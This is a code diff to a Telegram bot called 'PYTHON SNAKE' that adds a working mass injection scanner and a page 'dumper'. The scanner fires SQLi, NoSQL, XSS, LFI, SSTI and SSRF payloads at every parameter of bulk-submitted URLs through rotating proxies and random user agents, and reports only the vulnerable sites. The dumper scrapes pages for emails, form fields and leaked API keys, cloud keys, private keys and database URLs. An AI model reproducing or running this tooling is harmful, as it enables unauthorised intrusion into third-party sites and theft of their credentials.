@@ -65,7 +65,7 @@ BOT_TOKEN = "PUT_YOUR_BOT_TOKEN_HERE"
 ADMIN_IDS = [8999053405]
 ADMIN_USERNAME = "@Bloody_sweet_baby"
 BRAND = "PYTHON SNAKE"
-VERSION = "v2.9.3"
+VERSION = "v2.9.4"
 KEY_RE = re.compile(r"^SNK-[A-Z0-9]{4}-[A-Z0-9]{4}$")
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
@@ -350,6 +350,31 @@ def bar_pct(pct: float, width: int = 14) -> str:
     """Bar + percentage ek line me."""
     pct = max(0.0, min(100.0, float(pct)))
     return "%s  <b>%d%%</b>" % (bar(pct, width), int(round(pct)))
+
+
+INJ_SPIN = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
+DUMP_SPIN = "◐◓◑◒"
+
+
+def bar2(pct: float, width: int = 14, spin: int = 0) -> str:
+    """INJECTOR ka apna bar — ⟦▓▓▓░░░░⟧ + spinner (parser wale se alag).
+
+    spin=None → ✔ (kaam khatam).
+    """
+    pct = max(0.0, min(100.0, float(pct)))
+    filled = int(round(pct / 100.0 * width))
+    sp = "✔" if spin is None else INJ_SPIN[int(spin) % len(INJ_SPIN)]
+    return "%s ⟦%s%s⟧ <b>%d%%</b>" % (sp, "▓" * filled, "░" * (width - filled),
+                                      int(round(pct)))
+
+
+def bar3(pct: float, width: int = 12, spin: int = 0) -> str:
+    """DUMPER ka apna bar — ◐ [██████──────] 57%. spin=None → ✔."""
+    pct = max(0.0, min(100.0, float(pct)))
+    filled = int(round(pct / 100.0 * width))
+    sp = "✔" if spin is None else DUMP_SPIN[int(spin) % len(DUMP_SPIN)]
+    return "%s [%s%s]  <b>%d%%</b>" % (sp, "█" * filled, "─" * (width - filled),
+                                       int(round(pct)))
 
 
 def short_list(items, n=12) -> str:
@@ -2241,6 +2266,232 @@ def payloads_for(cat: str = "all") -> list:
     if not cat or cat == "all":
         return list(PAYLOADS)
     return list(PAYLOAD_CATS.get(cat) or PAYLOADS)
+
+
+# ── Probe matrix: har family ka ek chhota, asli test set ──────────────────
+INJ_PROBES = [
+    ("sqli", "'"),
+    ("sqli", "\\'"),
+    ("sqli", "1' AND '1'='2"),
+    ("blind", "1 AND 1=1"),
+    ("blind", "1' AND SLEEP(2)-- -"),
+    ("union", "-1 UNION SELECT 1,2,3-- -"),
+    ("union", "-1' UNION SELECT NULL,NULL,NULL-- -"),
+    ("waf", "%27%20OR%201%3D1--"),
+    ("nosql", "'\"}]}, {$ne: \"\"}"),
+    ("nosql", "{$gt: \"\"}"),
+    ("graphql", "){__typename}"),
+    ("graphql", "\" query {__schema{types{name}}}"),
+    ("xss", "\"><svg/onload=alert(1)>"),
+    ("lfi", "../../../../../../etc/passwd"),
+    ("lfi", "php://filter/convert.base64-encode/resource=index.php"),
+    ("ssti", "{{7*7}}"),
+    ("ssti", "${7*7}"),
+    ("ssrf", "http://169.254.169.254/latest/meta-data/"),
+    ("redirect", "//example.com/%2f.."),
+]
+
+SQL_GENERIC = ("sql syntax", "sqlstate", "unterminated", "quoted string",
+               "odbc", "jdbc", "syntax error at or near", "invalid query",
+               "mysql", "postgres", "ora-0", "sqlite", "microsoft ole db")
+
+LFI_MARKS = ("root:x:0:0", "root:!:0:0", "daemon:x:", "bin/bash", "bin/sh",
+             "[boot loader]", "for 16-bit app support", "PD9waHA")   # base64 <?php
+
+SSRF_MARKS = ("169.254.169.254", "metadata.google.internal", "instance-identity",
+              "ami-id", "secret-access-key", "127.0.0.1")
+
+SSTI_MARKS = ("49", "7777777")
+
+
+def inj_probes_for(cat: str, limit: int = 0) -> list:
+    """Selected category ke hisaab se probes. all = poori matrix (19)."""
+    if cat and cat in PAYLOAD_CATS and cat != "all":
+        base = [pl for pl in (PAYLOAD_CATS.get(cat) or [])]
+        return [(cat, pl) for pl in (base[:limit] if limit else base[:14])]
+    return INJ_PROBES[:limit] if limit else list(INJ_PROBES)
+
+
+def inj_build_case(raw: str, param: str, payload: str) -> str:
+    """Ek param me payload daalo — baaki query intact."""
+    try:
+        u = urlparse(raw)
+        pairs = parse_qsl(u.query, keep_blank_values=True)
+        if any(k == param for k, _ in pairs):
+            newp = [(k, payload if k == param else v) for k, v in pairs]
+            return urlunparse(u._replace(query=urlencode(newp, quote_via=quote_plus),
+                                         fragment=""))
+        base = urlunparse(u._replace(query="", fragment=""))
+        sep = "&" if u.query else "?"
+        if u.query:
+            return urlunparse(u._replace(query=u.query + "&" + param + "="
+                                         + quote_plus(payload), fragment=""))
+        return base + sep + param + "=" + quote_plus(payload)
+    except Exception:
+        return ""
+
+
+def inj_verdict(family: str, payload: str, status: int, headers: dict, body: str,
+                host: str = "") -> dict:
+    """Response dekho — vulnerable hai ya nahi. [] = clean."""
+    b = str(body or "")[:400000]
+    low = b.lower()
+    loc = str((headers or {}).get("Location") or (headers or {}).get("location") or "")
+    hits = dbms_fingerprint(b)
+    if family == "nosql":
+        for sig in ("MongoError", "unexpected token", "$where", "Cast to ObjectId",
+                    "BSONTypeError", "E11000 duplicate key"):
+            if sig.lower() in low:
+                return {"type": "NoSQL", "dbms": "MongoDB", "evidence": sig}
+        if hits:
+            db, pat = hits[0]
+            return {"type": "SQLi", "dbms": db, "evidence": pat}
+        return {}
+    if family == "graphql":
+        for sig in ("Cannot query field", "FieldUndefined", "Expected type",
+                    "__schema", "GRAPHQL_VALIDATION_FAILED", "must not have a selection"):
+            if sig.lower() in low:
+                return {"type": "GraphQL", "dbms": "", "evidence": sig}
+        return {}
+    if family in ("sqli", "blind", "union", "waf"):
+        if hits:
+            db, pat = hits[0]
+            return {"type": "SQLi", "dbms": db, "evidence": pat}
+        for sig in SQL_GENERIC:
+            if sig in low and status in (200, 500):
+                # payload ka key hissa body me ho to hi count karo
+                key = re.sub(r"[^A-Za-z0-9]", "", payload)[:6].lower()
+                if not key or key in low or "syntax" in low:
+                    return {"type": "SQLi", "dbms": "unknown", "evidence": sig}
+        return {}
+    if family == "xss":
+        needle = payload.replace("\\\"", "\"")
+        if needle and needle in b:
+            return {"type": "XSS", "dbms": "", "evidence": "payload reflected in HTML"}
+        return {}
+    if family == "lfi":
+        for m in LFI_MARKS:
+            if m in b:
+                return {"type": "LFI", "dbms": "", "evidence": "file content: %s" % m[:24]}
+        if "failed to open stream" in low or "include_path" in low:
+            return {"type": "LFI", "dbms": "", "evidence": "include() warning"}
+        return {}
+    if family == "ssti":
+        if "{{7*7}}" in payload or "${7*7}" in payload:
+            if "49" in b and "7*7" not in b[:2000]:
+                return {"type": "SSTI", "dbms": "", "evidence": "template evaluated 7*7=49"}
+        return {}
+    if family == "ssrf":
+        for m in SSRF_MARKS:
+            if m in low:
+                return {"type": "SSRF", "dbms": "", "evidence": "internal data: %s" % m}
+        return {}
+    if family == "redirect":
+        if loc and ("example.com" in loc or "//evil" in loc):
+            if host and host not in loc:
+                return {"type": "OPEN REDIRECT", "dbms": "", "evidence": "Location: %s" % loc[:60]}
+        return {}
+    if family == "ssti":
+        return {}
+    return {}
+
+
+INJ_STYLE = {"SQLi": "💉", "NoSQL": "🍃", "GraphQL": "🕸", "XSS": "🧪", "LFI": "📂",
+             "SSTI": "🧬", "SSRF": "🌐", "OPEN REDIRECT": "↪️"}
+
+
+async def inj_scan(urls: list, cat: str = "all", progress=None, uid=None,
+                   timeout: float = 8.0, conc: int = 30,
+                   max_targets: int = 0) -> dict:
+    """ASLI scan — har URL ka har param, payload bhej ke response check karta hai."""
+    urls = _uniq([u for u in (urls or []) if str(u).startswith("http")])
+    probes = inj_probes_for(cat)
+    per_url = int(max_targets or sget("inj_targets", 36) or 36)
+    st = {"urls": len(urls), "urls_done": 0, "tested": 0, "total": 0,
+          "vulns": [], "blocked": 0, "errors": 0, "start": time.time(),
+          "cat": cat, "stopped": 0}
+    # total count (progress ke liye)
+    plan = []
+    for raw in urls:
+        info = url_reverse(raw)
+        params = (info.get("params") or [])[:3] or ["id"]
+        cases = []
+        for pn in params:
+            for fam, pl in probes:
+                u = inj_build_case(raw, pn, pl)
+                if u:
+                    cases.append((u, fam, pl, pn))
+                if len(cases) >= per_url:
+                    break
+            if len(cases) >= per_url:
+                break
+        plan.append((raw, cases))
+        st["total"] += len(cases)
+
+    rot = ProxyRotator(enabled=proxy_available())
+    sem = asyncio.Semaphore(max(4, min(80, conc)))
+    seen = set()
+    lock = asyncio.Lock()
+    conn = mk_connector(limit=max(10, conc), force_close=True)
+
+    async def one(session, raw, u, fam, pl, pn):
+        if uid and stop_requested(uid):
+            return
+        async with sem:
+            if uid and stop_requested(uid):
+                return
+            kw = {"headers": dict(UA, **{"User-Agent": random.choice(UA_LIST)}),
+                  "timeout": aiohttp.ClientTimeout(total=timeout),
+                  "ssl": False, "allow_redirects": False}
+            px = rot.next()
+            if px:
+                pxc, _h2, _ip2, _s2 = await proxy_connect_url(px)
+                kw["proxy"] = pxc
+            try:
+                async with session.get(u, **kw) as r:
+                    body = ""
+                    try:
+                        body = await r.text(errors="ignore")
+                    except Exception:
+                        body = ""
+                    verdict = inj_verdict(fam, pl, r.status, dict(r.headers), body,
+                                          urlparse(raw).hostname or "")
+                    async with lock:
+                        st["tested"] += 1
+                        if r.status in (403, 429, 503):
+                            st["blocked"] += 1
+                        if verdict:
+                            key = (raw, pn, verdict["type"])
+                            if key not in seen:
+                                seen.add(key)
+                                st["vulns"].append({"base": raw, "url": u, "param": pn,
+                                                    "payload": pl, "type": verdict["type"],
+                                                    "dbms": verdict.get("dbms", ""),
+                                                    "evidence": verdict.get("evidence", ""),
+                                                    "status": r.status})
+            except Exception:
+                async with lock:
+                    st["tested"] += 1
+                    st["errors"] += 1
+
+    async with aiohttp.ClientSession(connector=conn) as session:
+        for raw, cases in plan:
+            if uid and stop_requested(uid):
+                st["stopped"] = 1
+                break
+            await asyncio.gather(*[one(session, raw, u, fam, pl, pn)
+                                   for (u, fam, pl, pn) in cases])
+            st["urls_done"] += 1
+            if progress:
+                try:
+                    await progress(st)
+                except Exception:
+                    pass
+    st["took"] = time.time() - st["start"]
+    st["by_type"] = {}
+    for v in st["vulns"]:
+        st["by_type"][v["type"]] = st["by_type"].get(v["type"], 0) + 1
+    return st
 
 
 def inject_all_payloads(urls: list, cat: str = "all") -> list:
@@ -4829,6 +5080,12 @@ async def _route_tool_cb(update, context, data: str):
         if rest == "manual":
             return await cb_rand_manual(update, context)
     elif head == "df":
+        if rest == "go":
+            return await cb_dump_go(update, context)
+        if rest == "old":
+            return await cb_dump_old(update, context)
+        if rest in ("last", "vuln"):
+            return await cb_dump_use(update, context, rest)
         return await cb_dump_file(update, context)
     elif head == "px":
         if rest == "run":
@@ -4838,6 +5095,8 @@ async def _route_tool_cb(update, context, data: str):
         if rest == "clear":
             return await cb_proxy_clear(update, context)
     elif head == "inj":
+        if rest == "go":
+            return await cb_inj_go(update, context)
         if rest == "last":
             return await cb_inj_last(update, context)
         if rest.startswith("cat:"):
@@ -6384,39 +6643,80 @@ async def input_rev_urls(update, context, text: str):
 #  TOOL: INJECTOR
 # ═══════════════════════════════════════════════════════════════════════════════
 async def tool_inj(update, context):
+    """INJECTOR — asli scan: URLs do, sirf vulnerable wapas."""
     q = update.callback_query
     cat = context.user_data.get("inj_cat", "all")
+    if cat not in CAT_LABEL:
+        cat = "all"
     rows = []
-    keys = list(CAT_LABEL.keys())
+    keys = [k for k in CAT_LABEL if k != "all"]
+    rows.append([InlineKeyboardButton("🎯 ALL (%d probes)" % len(INJ_PROBES),
+                                      callback_data="inj:cat:all")])
     for i in range(0, len(keys), 3):
         row = []
         for k in keys[i:i + 3]:
             label = CAT_LABEL[k] + ("  ✅" if k == cat else "")
             row.append(InlineKeyboardButton(label, callback_data="inj:cat:" + k))
         rows.append(row)
-    rows.append([InlineKeyboardButton("📥 LAST PARSER RESULTS", callback_data="inj:last")])
+    rows.append([InlineKeyboardButton("🚀 SEND URLS (re-arm input)", callback_data="inj:go")])
+    rows.append([InlineKeyboardButton("📥 LAST PARSER URLS (%d)" % len(context.user_data.get("last_urls") or []),
+                                      callback_data="inj:last")])
     rows.append([InlineKeyboardButton("⬅️ BACK", callback_data="m:home")])
-    txt = (H("INJECTOR", "%s payloads • %d categories" % (fmt(len(PAYLOADS)),
-                                                          len(PAYLOAD_CATS))) + "\n\n"
-           + KV("Selected", "<b>%s</b>" % CAT_LABEL.get(cat, cat), "🎯") + "\n"
-           + KV("Payloads", "<code>%s</code>" % fmt(len(payloads_for(cat))), "💉") + "\n"
-           + KV("SQL family", "<code>%s</code>"
-               % fmt(sum(len(PAYLOAD_CATS[k]) for k in SQLI_FAMILY)), "🧨") + "\n"
-           + KV("DBMS patterns", "<code>%s</code> • %d databases"
-               % (fmt(DBMS_COUNT), len(DBMS_ERRORS)), "🔍") + "\n\n"
-           + P("Pick a category, then send URLs — every parameter gets a payload.") + "\n"
-           + "<code>https://target.com/product.php?id=1</code>")
+    probes = inj_probes_for(cat)
+    txt = (H("SQLi SCANNER", "step 1 — send URLs") + "\n\n"
+           + B("Paste URLs now") + "\n"
+           + P("one per line, or send a .txt file — as many URLs as you have.") + "\n"
+           + "<code>https://target.com/product.php?id=1</code>\n\n"
+           + B("Step 2 — pick probes") + "\n"
+           + P("Default is ALL. Pick a category below to run only those probes.")
+           + "\n\n"
+           + KV("Category", "<b>%s</b>" % CAT_LABEL.get(cat, cat), "🎯") + "\n"
+           + KV("Probes / param", "<code>%d</code>" % len(probes), "🔍") + "\n"
+           + KV("Payload bank", "<code>%s</code> in %d categories"
+               % (fmt(len(PAYLOADS)), len(PAYLOAD_CATS)), "💉") + "\n"
+           + KV("DBMS fingerprints", "<code>%s</code> • %d databases"
+               % (fmt(DBMS_COUNT), len(DBMS_ERRORS)), "🧬") + "\n"
+           + KV("Timeout / target", "<code>%ss</code> • max <code>%s</code> tests per URL"
+               % (int(sget("inj_timeout", 8) or 8), fmt(int(sget("inj_targets", 36) or 36))), "⏱") + "\n\n"
+           + B("How it works") + "\n"
+           + P("Send URLs (paste or .txt file). Every parameter gets tested with real "
+               "payloads, and the response is checked for DB errors, reflection, traversal "
+               "or template evaluation.") + "\n\n"
+           + P("Only vulnerable URLs are returned — clean pages are dropped."))
     try:
-        await q.edit_message_text(txt, reply_markup=RK(rows),
-                                  parse_mode=ParseMode.HTML)
+        await q.edit_message_text(txt, reply_markup=RK(rows), parse_mode=ParseMode.HTML)
     except Exception:
         pass
-    await_set(context, "inj_urls")
+    await_set(context, "inj_urls")          # screen khulte hi URL input ready
 
 
 async def cb_inj_cat(update, context, cat: str):
     context.user_data["inj_cat"] = cat if cat in CAT_LABEL else "all"
     return await tool_inj(update, context)
+
+
+async def cb_inj_go(update, context):
+    """🚀 START SCAN — URLs maango (text ya file)."""
+    q = update.callback_query
+    cat = context.user_data.get("inj_cat", "all")
+    last = context.user_data.get("last_urls") or []
+    rows = []
+    if last:
+        rows.append([InlineKeyboardButton("📥 USE LAST %d PARSER URLS" % len(last),
+                                          callback_data="inj:last")])
+    rows.append([InlineKeyboardButton("⬅️ BACK", callback_data="m:inj")])
+    txt = (H("SEND URLS", CAT_LABEL.get(cat, cat)) + "\n\n"
+           + B("Paste URLs") + "\n" + P("one per line, or comma separated") + "\n"
+           + "<code>https://site.com/page.php?id=5</code>\n\n"
+           + B("Or send a file") + "\n" + P(".txt / .csv / .json / .xlsx — every URL inside")
+           + "\n\n" + KV("Probes", "<code>%d</code> per parameter" % len(inj_probes_for(cat)), "🔍")
+           + "\n" + KV("Max per URL", "<code>%s</code>" % fmt(int(sget("inj_targets", 36) or 36)), "🎯")
+           + "\n\n" + P("Only vulnerable URLs come back — clean pages are dropped."))
+    try:
+        await q.edit_message_text(txt, reply_markup=RK(rows), parse_mode=ParseMode.HTML)
+    except Exception:
+        pass
+    await_set(context, "inj_urls")
 
 
 async def cb_inj_last(update, context):
@@ -6431,74 +6731,134 @@ async def cb_inj_last(update, context):
     await _run_inject(update, context, urls)
 
 
+def _urls_from_text(text: str, limit: int = 2000) -> list:
+    got = re.findall(r"https?://[^\s,'\"<>)\]]+", str(text or ""))
+    return _uniq(got)[:limit]
+
+
 async def input_inj_urls(update, context, text: str):
-    urls = [x.strip() for x in re.split(r"[\s,]+", text) if x.strip().startswith("http")]
+    urls = _urls_from_text(text)
     if not urls:
-        await update.effective_message.reply_text(
-            "❌ <b>These are not URLs — send URLs.</b>\n\n"
-            "✅ Jaise: <code>https://site.com/page.php?id=5</code>\n"
-            "<i>Ek line me ek URL.</i>", parse_mode=ParseMode.HTML,
+        await reply_msg(update).reply_text(
+            "❌ <b>No URLs found.</b>\n\n"
+            "Send full URLs, one per line:\n"
+            "<code>https://site.com/page.php?id=5</code>\n"
+            "<i>Or send a .txt file.</i>", parse_mode=ParseMode.HTML,
             reply_markup=kb_back("m:inj"))
         await_set(context, "inj_urls")
         return
-    await _run_inject(update, context, urls[:200])
+    await _run_inject(update, context, urls)
+
+
+def _inj_progress_card(st: dict, spin: int) -> str:
+    pct = (st["tested"] / max(1, st["total"])) * 100
+    took = max(0.001, time.time() - st["start"])
+    speed = st["tested"] / took
+    left = max(0, st["total"] - st["tested"])
+    eta = (left / speed) if speed > 0.1 else 0
+    return (H("SCANNING", "%s • %d probes" % (CAT_LABEL.get(st.get("cat"), "ALL"),
+                                              len(inj_probes_for(st.get("cat") or "all"))))
+            + "\n\n" + bar2(pct, 14, spin) + "\n\n"
+            + "◆ URLs       : <code>%s/%s</code>\n" % (fmt(st["urls_done"]), fmt(st["urls"]))
+            + "◆ Tested     : <code>%s/%s</code>\n" % (fmt(st["tested"]), fmt(st["total"]))
+            + "◆ Vulnerable : <code>%s</code>\n" % fmt(len(st["vulns"]))
+            + "◆ Blocked    : <code>%s</code>\n" % fmt(st["blocked"])
+            + "◆ Speed      : <code>%.1f req/s</code>\n" % speed
+            + "◆ ETA        : <code>%s</code>" % (("%.0fs" % eta) if eta else "—"))
+
+
+def _inj_vuln_lines(vulns, n: int = 6) -> str:
+    out = []
+    for v in vulns[:n]:
+        icon = INJ_STYLE.get(v["type"], "⚠️")
+        head = "%s <b>%s</b>%s · param <code>%s</code>" % (
+            icon, esc(v["type"]),
+            (" · " + esc(v["dbms"])) if v.get("dbms") else "", esc(v["param"]))
+        base = v.get("base") or v.get("url") or ""
+        out.append(head + "\n<code>%s</code>\n<i>poc: %s → %s</i>"
+                   % (esc(base[:160]), esc(str(v.get("payload") or "")[:40]),
+                      esc(v.get("evidence") or "")[:70]))
+    if len(vulns) > n:
+        out.append("<i>+ %d more in the file…</i>" % (len(vulns) - n))
+    return "\n\n".join(out)
 
 
 async def _run_inject(update, context, urls):
+    """ASLI scan — inj_scan chalao, live bar2 progress, phir sirf vulnerable."""
     cat = context.user_data.get("inj_cat", "all")
-    msg = None
-    try:
-        msg = await update.effective_message.reply_text("💉 Building targets…")
-    except Exception:
-        pass
-    t0 = time.time()
-    _ib = inj_batch_size()
-    _nb = (len(urls) + _ib - 1) // max(1, _ib)
-    out = []
-    _uid = str(update.effective_user.id) if getattr(update, "effective_user", None) else None
-    if _uid:
-        ACTIVE_UID["uid"] = update.effective_user.id
-        stop_clear(_uid)
-        stop_mark(_uid)   # STOP button token
-    for _bi in range(_nb):
-        if _uid and stop_requested(_uid):
-            break
-        _chunk = urls[_bi * _ib:(_bi + 1) * _ib]
-        out.extend(inject_all_payloads(_chunk, cat))
-        if msg and _nb > 1:
-            try:
-                await msg.edit_text("💉 <b>%s</b>\n%s\n\n📦 Batch <code>%d/%d</code> • "
-                                    "targets: <code>%s</code>"
-                                    % (F("INJECTOR", T()["head"]), T()["div"],
-                                       _bi + 1, _nb, fmt(len(out))),
-                                    parse_mode=ParseMode.HTML)
-            except Exception:
-                pass
-    took = time.time() - t0
-    if not out:
-        if msg:
-            try:
-                await msg.edit_text("❌ Nothing generated.")
-            except Exception:
-                pass
-        return
-    path, cnt = dump_text(out, "inject_" + cat, "PYTHON SNAKE — injector (%s)" % cat)
-    txt = (H("INJECTOR — DONE", CAT_LABEL.get(cat, cat)) + "\n\n"
-           "🎯 Input URLs : <code>%s</code>\n"
-           "📦 Batch      : <code>%s × %d</code>\n"
-           "💉 Payloads   : <code>%d</code>\n"
-           "✅ Targets    : <code>%s</code>\n"
-           "⏱ Time       : <code>%.2fs</code>\n\n%s"
-           % (fmt(len(urls)), fmt(_ib), _nb, len(payloads_for(cat)), fmt(cnt), took,
-              short_list(out[:8], 8)))
-    if msg:
+    uid = str(update.effective_user.id)
+    ACTIVE_UID["uid"] = update.effective_user.id
+    stop_clear(uid)
+    tok = stop_mark(uid)
+    urls = _uniq([u for u in urls if str(u).startswith("http")])
+    msg = await reply_msg(update).reply_text(
+        _inj_progress_card({"urls": len(urls), "urls_done": 0, "tested": 0, "total": 0,
+                            "vulns": [], "blocked": 0, "start": time.time(), "cat": cat}, 0),
+        parse_mode=ParseMode.HTML, reply_markup=kb_stop(uid, tok))
+    spin = {"n": 0}
+    last = {"t": 0.0}
+
+    async def prog(st):
+        if time.time() - last["t"] < 2.0:
+            return
+        last["t"] = time.time()
+        spin["n"] += 1
         try:
-            await msg.delete()
+            await msg.edit_text(_inj_progress_card(st, spin["n"]),
+                                parse_mode=ParseMode.HTML, reply_markup=kb_stop(uid, tok))
         except Exception:
             pass
-    await update.effective_message.reply_text(txt, parse_mode=ParseMode.HTML,
-                                              reply_markup=kb_back("m:inj"))
-    await send_file(update, path, "💉 %d %s targets" % (cnt, cat))
+
+    st = await inj_scan(urls, cat, progress=prog, uid=uid,
+                        timeout=float(sget("inj_timeout", 8) or 8),
+                        conc=int(sget("inj_conc", 30) or 30),
+                        max_targets=int(sget("inj_targets", 36) or 36))
+    vulns = st["vulns"]
+    took = st.get("took", 0)
+    speed = st["tested"] / max(0.001, took)
+    clean = max(0, st["urls_done"] - len({v["base"] for v in vulns}))
+    head = ("⚠️ <b>%d vulnerable URL(s) found</b>" % len(vulns)) if vulns else \
+        "🛡 <b>No vulnerabilities found</b>"
+    body = (H("SQLi SCAN COMPLETE", "%.1fs" % took) + "\n\n"
+            + head + "\n"
+            + "🎯 Total tested: <code>%s</code>\n" % fmt(st["tested"])
+            + "🌐 URLs scanned: <code>%s</code> (clean <code>%s</code>)\n" % (fmt(st["urls_done"]), fmt(clean))
+            + "🚫 Blocked: <code>%s</code>\n" % fmt(st["blocked"])
+            + "⚡ Speed: <code>%.1f req/s</code>\n" % speed
+            + ("⛔ Stopped early\n" if st.get("stopped") else "")
+            + "\n" + bar2(100, 14, None))
+    if vulns:
+        if st["by_type"]:
+            body += "\n\n" + B("By type") + "\n" + " · ".join(
+                "%s %s <code>%s</code>" % (INJ_STYLE.get(k, "•"), esc(k), fmt(v))
+                for k, v in sorted(st["by_type"].items(), key=lambda z: -z[1]))
+        body += "\n\n" + B("Vulnerable") + "\n" + _inj_vuln_lines(vulns, 6)
+    try:
+        await msg.delete()
+    except Exception:
+        pass
+    for ch in chunk_lines(body)[:3]:
+        await reply_msg(update).reply_text(ch, parse_mode=ParseMode.HTML,
+                                           reply_markup=kb_back("m:inj"))
+    if vulns:
+        base_urls = _uniq([v["base"] for v in vulns])
+        path, cnt = dump_text(base_urls, "vuln_" + str(cat),
+                              "PYTHON SNAKE — vulnerable URLs (%s)" % cat)
+        await send_file(update, path, "💉 %d vulnerable URL(s)" % cnt)
+        rows = ["type,dbms,param,status,url,poc,evidence"]
+        for v in vulns:
+            rows.append("%s,%s,%s,%s,\"%s\",\"%s\",\"%s\"" % (
+                v["type"], v.get("dbms", ""), v["param"], v.get("status", ""),
+                v["base"].replace('"', "%22"), v["url"].replace('"', "%22"),
+                str(v.get("evidence", "")).replace('"', "'")[:90]))
+        csvp = os.path.join(DUMP_DIR, "vuln_report_%s.csv" % stamp())
+        with open(csvp, "w", encoding="utf-8") as f:
+            f.write("\n".join(rows) + "\n")
+        await send_file(update, csvp, "📊 Full report (csv)")
+        context.user_data["last_vulns"] = vulns
+    context.user_data["last_inj_stats"] = {k: st[k] for k in
+                                           ("tested", "total", "urls", "blocked", "took")}
+    context.user_data.pop("inj_pending", None)
     await_clear(context)
 
 
@@ -7277,29 +7637,428 @@ async def input_rand(update, context, text: str):
     await_clear(context)
 
 
+SECRET_RX = [
+    ("google_api", r"AIza[0-9A-Za-z_\-]{35}"),
+    ("aws_key", r"AKIA[0-9A-Z]{16}"),
+    ("stripe", r"sk_live_[0-9A-Za-z]{20,}"),
+    ("github", r"gh[pousr]_[0-9A-Za-z]{20,}"),
+    ("slack", r"xox[baprs]-[0-9A-Za-z\-]{10,}"),
+    ("jwt", r"eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}"),
+    ("private_key", r"-----BEGIN (RSA |EC |OPENSSH |DSA )?PRIVATE KEY-----"),
+    ("db_url", r"(?:mysql|postgres|postgresql|mongodb(?:\+srv)?|redis|amqp)://[^\s\"'<>]{8,}"),
+]
+SECRET_RX = [(n, re.compile(p)) for n, p in SECRET_RX]
+FORM_RX = re.compile(r"<form\b[^>]*>", re.I)
+INPUT_RX = re.compile(r"<input\b[^>]*>", re.I)
+ATTR_RX = re.compile(r"""(\w+)\s*=\s*["']([^"']*)["']""")
+
+
+def _attrs(tag: str) -> dict:
+    return {k.lower(): v for k, v in ATTR_RX.findall(tag)}
+
+
+def dump_extract(url: str, status: int, headers: dict, body: str) -> dict:
+    """Ek page se saara kaam ka data nikaalo (asli parse, koi mock nahi)."""
+    b = str(body or "")
+    h = {str(k).lower(): v for k, v in (headers or {}).items()}
+    rec = {"url": url, "status": status, "server": str(h.get("server") or ""),
+           "ctype": str(h.get("content-type") or ""), "bytes": len(b),
+           "title": "", "forms": [], "endpoints": [], "params": [], "emails": [],
+           "js": [], "secrets": [], "comments": [], "tables": [], "meta": {},
+           "powered_by": str(h.get("x-powered-by") or "")}
+    m = re.search(r"<title[^>]*>(.*?)</title>", b, re.I | re.S)
+    if m:
+        rec["title"] = re.sub(r"\s+", " ", m.group(1)).strip()[:120]
+    m = re.search(r'<meta[^>]+name=["\']generator["\'][^>]+content=["\']([^"\']+)', b, re.I)
+    if m:
+        rec["meta"]["generator"] = m.group(1)[:60]
+    # forms (har form ke apne input fields — asli HTML parse)
+    fmatches = list(FORM_RX.finditer(b))[:25]
+    for i, fm in enumerate(fmatches):
+        fa = _attrs(fm.group(0))
+        seg_end = fmatches[i + 1].start() if i + 1 < len(fmatches) else min(len(b), fm.end() + 6000)
+        seg = b[fm.end():seg_end]
+        fields = []
+        for itag in INPUT_RX.findall(seg)[:40]:
+            nm = (_attrs(itag).get("name") or "").strip()
+            if nm and nm not in fields:
+                fields.append(nm[:40])
+        rec["forms"].append({"action": (fa.get("action") or "")[:160],
+                             "method": (fa.get("method") or "get").lower(),
+                             "id": (fa.get("id") or fa.get("name") or "")[:40],
+                             "fields": fields})
+    # inputs (form ke bahar wale bhi, params list ke liye)
+    for itag in INPUT_RX.findall(b)[:200]:
+        nm = (_attrs(itag).get("name") or "").strip()
+        if nm and nm not in rec["params"]:
+            rec["params"].append(nm[:40])
+    # links + endpoints
+    host = urlparse(url).hostname or ""
+    for href in re.findall(r"""href\s*=\s*["']([^"'#]+)["']""", b, re.I)[:400]:
+        if href.startswith(("javascript:", "mailto:", "tel:", "data:")):
+            continue
+        full = urljoin(url, href)
+        p = urlparse(full)
+        if p.netloc and host and host not in p.netloc:
+            continue
+        qs = [k for k, _v in parse_qsl(p.query, keep_blank_values=True)]
+        for k in qs:
+            if k and k not in rec["params"]:
+                rec["params"].append(k[:40])
+        rec["endpoints"].append(full[:300])
+    rec["endpoints"] = _uniq(rec["endpoints"])[:200]
+    # js files
+    for src in re.findall(r"""<script[^>]+src\s*=\s*["']([^"']+)["']""", b, re.I)[:60]:
+        rec["js"].append(urljoin(url, src)[:300])
+    rec["js"] = _uniq(rec["js"])[:40]
+    # emails
+    rec["emails"] = _uniq(re.findall(r"[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,12}", b))[:60]
+    # comments
+    for c in re.findall(r"<!--(.*?)-->", b, re.S)[:40]:
+        c = re.sub(r"\s+", " ", c).strip()
+        if c and len(c) > 3 and not c.lower().startswith(("[if", "google")):
+            rec["comments"].append(c[:160])
+    # table / column hints (koi SQL inject nahi — sirf page pe likhe naam)
+    for t in re.findall(r"(?:from|join|into|update)\s+[`\"']?([a-z_][a-z0-9_]{2,30})[`\"']?",
+                        b, re.I)[:40]:
+        if t.lower() not in ("the", "this", "that", "your", "select", "table"):
+            rec["tables"].append(t)
+    rec["tables"] = _uniq(rec["tables"])[:30]
+    # secrets
+    for name, rx in SECRET_RX:
+        for hit in rx.findall(b)[:3]:
+            rec["secrets"].append((name, str(hit)[:80]))
+    return rec
+
+
+def dump_record_text(rec: dict) -> list:
+    """Ek record ko readable lines me — copy-paste safe (plain values)."""
+    L_ = ["=" * 62, "URL     : " + rec["url"], "Status  : %s   Server: %s   Type: %s"
+          % (rec["status"], rec["server"] or "-", rec["ctype"] or "-"),
+          "Size    : %s bytes" % fmt(rec["bytes"]),
+          "Title   : " + (rec["title"] or "-")]
+    if rec.get("powered_by"):
+        L_.append("Powered : " + rec["powered_by"])
+    if rec["meta"]:
+        L_.append("Meta    : " + ", ".join("%s=%s" % kv for kv in rec["meta"].items()))
+    if rec["forms"]:
+        L_.append("-" * 62)
+        L_.append("FORMS (%d)" % len(rec["forms"]))
+        for f in rec["forms"]:
+            L_.append("  [%s] %s   id=%s" % (f["method"].upper(), f["action"] or "self",
+                                             f["id"] or "-"))
+            if f.get("fields"):
+                L_.append("       fields: " + ", ".join(f["fields"]))
+    if rec["params"]:
+        L_.append("-" * 62)
+        L_.append("PARAMETERS (%d)" % len(rec["params"]))
